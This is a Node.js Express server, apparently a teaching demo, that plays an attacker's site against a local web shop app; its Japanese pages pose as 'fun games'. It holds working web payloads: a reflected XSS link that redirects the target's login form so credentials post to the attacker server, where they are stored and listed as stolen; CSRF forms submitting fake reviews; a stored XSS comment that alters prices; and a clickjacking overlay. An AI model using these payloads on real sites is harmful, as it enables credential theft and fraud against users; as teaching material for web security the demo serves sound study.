const express = require('express')
const ejs = require('ejs')
const cookieParser = require('cookie-parser')
const sqlite3 = require('sqlite3')

const HOST='0.0.0.0'
const PORT=8081
const TARGET_URL='http://localhost:8080'
const EVIL_DATABASE_FILE = 'evil.db'

const app = express()
app.use(express.urlencoded({ extended: true }))
app.use(cookieParser())

app.get('/', (req, res) => {
    if (req.header('HOST') === 'localhost:' + PORT) {
        res.redirect('http://' + HOST + ':' + PORT)
        return
    }
    res.send(`
<h1>攻撃者が準備したサイト</h1>
<ul>
    <li><a href="/users">盗んだユーザー情報</a></li>
    <li><a href="/game0">XSS</a></li>
    <li><a href="/game1">CSRF</a></li>
    <li><a href="/game2">CSRF + Persistent XSS</a></li>
    <li><a href="/game3">Clickjacking</a></li>
</ul>`)
})

app.get('/users', (req, res) => {
    const db = new sqlite3.Database(EVIL_DATABASE_FILE)
    db.all('SELECT * FROM users;', (err, rows) => {
        res.send(ejs.render(`
<p>盗んだユーザー情報</p>
<table border="1">
    <tr><th>時刻</th><th>メールアドレス</th><th>パスワード</th></tr>
    <% for (let row of rows) { %>
    <tr><td><%= new Date(row.datetime) %></td><td><%= row.email %></td><td><%= row.password %></td></tr>
    <% } %>
</table>`, { rows }))
    })
})

app.post('/users', (req, res) => {
    const email = req.body.email
    const password = req.body.password
    const db = new sqlite3.Database(EVIL_DATABASE_FILE)
    db.run('INSERT INTO users (datetime, email, password) VALUES (?, ?, ?)', [new Date(), email, password], (err, rows) => {
        res.redirect(TARGET_URL + '/logout')
    })
})

app.get('/game0', (req, res) => {
    res.send(ejs.render(`
<p>楽しいゲームで遊ぶには、<a target="_blank" href="<%= url %>/login?message=<script>window.onload=function(){document.querySelector('form').action='http://<%= host %>:<%= port %>/users'}</script>">ここをクリック</a>してね！</p>
    `, { url: TARGET_URL, host: HOST, port: PORT }))
})

app.get('/game1', (req, res) => {
    res.send(ejs.render(`
<p>とっても楽しいゲームだよ！</p>
<form action="<%= url %>/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="最高の商品です！本当は★100を付けたいくらい！" />
  <input type="submit" value="遊んでみる" />
</form>`, { url: TARGET_URL}))
})

app.get('/game2', (req, res) => {
    res.send(ejs.render(`
<p>いまだかつてないくらい楽しいゲームだよ！</p>
<form action="<%= url %>/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="本当は★100を付けたいくらい最高の商品なのに、今だけ100円で売ってます！！<script>window.onload=function(){
      var td = document.querySelectorAll('tr td')[7];
      td.innerHTML = '<s>' + td.innerHTML + '</s><b>今だけ100円！！</b>';
  }</script>" />
  <input type="submit" value="遊んでみる" />
</form>`, { url: TARGET_URL}))
})

app.get('/game3', (req, res) => {
    res.send(ejs.render(`
<p>下の方に面白いゲームが遊べるボタンがあるよ！ちゃんと押せるかな？？</p>
<p><input type="checkbox" onchange="invisible(this.checked)">消す</p>
<iframe src="<%= url %>/products" width="800" height="1200"></iframe>
<button style="position:absolute; top:370; left:455; z-index:-1;">あそんでみる</button>
<script>function invisible(checked) {
    const iframe = document.querySelector('iframe');
    if (checked) {
        iframe.style = 'opacity:0.001; filter:alpha(opacity=0.001);';
    } else {
        iframe.style = '';
    }
}</script>`, { url: TARGET_URL }))
})

app.listen(PORT, HOST, () => {
    console.log(`Server ready at http://${HOST}:${PORT}`)
})
